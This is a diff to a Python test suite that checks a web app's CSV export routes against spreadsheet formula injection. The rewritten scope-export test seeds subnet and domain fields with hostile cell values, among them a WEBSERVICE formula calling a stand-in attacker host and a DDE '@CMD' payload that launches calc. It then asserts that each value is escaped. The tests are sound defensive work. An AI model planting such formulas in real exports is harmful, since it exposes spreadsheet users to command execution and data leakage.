@@ -55,65 +55,28 @@ def test_csv_safe_none_becomes_empty_string():
 
 
 # ---------------------------------------------------------------------------
-# Endpoint-level — the three lightweight CSV branches in export.py that the
+# Endpoint-level — the lightweight CSV branches in export.py that the
 # v2.86.4 hardening missed (third code review #1): the routes that hand-roll
-# csv.writer.
+# csv.writer.  (The out-of-scope host export went in 2.521.0 — Hosts'
+# out-of-scope filter and its tool-ready export are that list now.)
 # ---------------------------------------------------------------------------
 
 
-def test_out_of_scope_csv_neutralizes_malicious_hostname(
+def test_scope_csv_neutralizes_a_malicious_description_and_site(
     client, db_session, test_project,
 ):
-    """v2.91.4 — /export/out-of-scope CSV branch flows hostnames through
-    safe_csv_row.  Pre-fix the hostname was emitted raw."""
-    from app.db import models
-
-    host = models.Host(
-        ip_address="10.55.55.5",
-        hostname="=WEBSERVICE(\"http://attacker.tld\")",
-        state="up",
-        project_id=test_project.id,
-    )
-    db_session.add(host)
-    db_session.commit()
-
-    resp = client.get(
-        f"/api/v1/projects/{test_project.id}/export/out-of-scope?format_type=csv"
-    )
-    assert resp.status_code == 200
-    rows = _parse_csv(resp.text)
-    # Header row + at least one data row containing our host.
-    data_row = next((r for r in rows[1:] if r and r[0] == "10.55.55.5"), None)
-    assert data_row is not None, f"injected host missing from output: {rows!r}"
-    assert data_row[1].startswith("'="), (
-        f"hostname formula not neutralized: {data_row[1]!r}"
-    )
-
-
-def test_scope_hosts_csv_neutralizes_malicious_hostname(
-    client, db_session, test_project,
-):
-    """v2.91.4 — the /export/scope CSV branch flows hostnames
-    through safe_csv_row."""
+    """The /export/scope CSV is the declared scope since 2.521.0: the
+    people-typed cells (description, site) flow through safe_csv_row, as the
+    scanner-derived hostname did when it listed hosts (v2.91.4)."""
     from app.db import models
 
     scope = models.Scope(project_id=test_project.id)
     db_session.add(scope)
     db_session.flush()
-
-    subnet = models.Subnet(scope_id=scope.id, cidr="10.66.66.0/24")
-    db_session.add(subnet)
-    db_session.flush()
-
-    host = models.Host(
-        ip_address="10.66.66.6",
-        hostname="+SUM(0)",
-        state="up",
-        project_id=test_project.id,
-    )
-    db_session.add(host)
-    db_session.flush()
-    db_session.add(models.HostSubnetMapping(host_id=host.id, subnet_id=subnet.id))
+    db_session.add(models.Subnet(scope_id=scope.id, cidr="10.66.66.0/24",
+                                 description="+SUM(0)", site="=WEBSERVICE(\"http://attacker.tld\")"))
+    db_session.add(models.ScopeDomain(scope_id=scope.id, domain="example.com",
+                                      include_subdomains=False, description="@CMD|'/c calc'!A1"))
     db_session.commit()
 
     resp = client.get(
@@ -121,11 +84,12 @@ def test_scope_hosts_csv_neutralizes_malicious_hostname(
     )
     assert resp.status_code == 200, resp.text
     rows = _parse_csv(resp.text)
-    data_row = next((r for r in rows[1:] if r and r[0] == "10.66.66.6"), None)
-    assert data_row is not None, f"injected host missing from output: {rows!r}"
-    assert data_row[1].startswith("'+"), (
-        f"hostname formula not neutralized: {data_row[1]!r}"
-    )
+    subnet_row = next((r for r in rows[1:] if r and r[0] == "10.66.66.0/24"), None)
+    domain_row = next((r for r in rows[1:] if r and r[0] == "example.com"), None)
+    assert subnet_row is not None and domain_row is not None, rows
+    assert subnet_row[2].startswith("'+"), subnet_row
+    assert subnet_row[3].startswith("'="), subnet_row
+    assert domain_row[2].startswith("'@"), domain_row
 
 
 def test_scan_hosts_csv_neutralizes_malicious_hostname(
